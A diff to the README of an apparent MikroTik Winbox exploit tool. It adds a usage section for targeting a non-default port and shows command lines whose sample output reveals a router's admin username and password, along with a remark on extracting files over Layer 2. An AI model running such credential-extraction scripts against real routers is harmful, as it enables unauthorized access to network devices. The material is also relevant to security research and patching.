@@ -13,12 +13,20 @@ Note that this script will NOT run with Python2.x. Use only Python 3+
 Winbox (TCP/IP)
 ```
 $ python3 WinboxExploit.py 172.17.17.17
-$ python3 WinboxExploitPort.py 172.17.17.17 8900
 
 User: admin
 Pass: Th3P4ssWord
 
 ```  
+
+Winbox (TCP/IP) On non default Port
+```
+$ python3 WinboxExploitPort.py 172.17.17.17 8900
+
+User: admin
+Pass: Th3P4ssWord
+
+``` 
 
 MAC server Winbox (Layer 2)  
 You can extract files even if the device doesn't have an IP address :-)
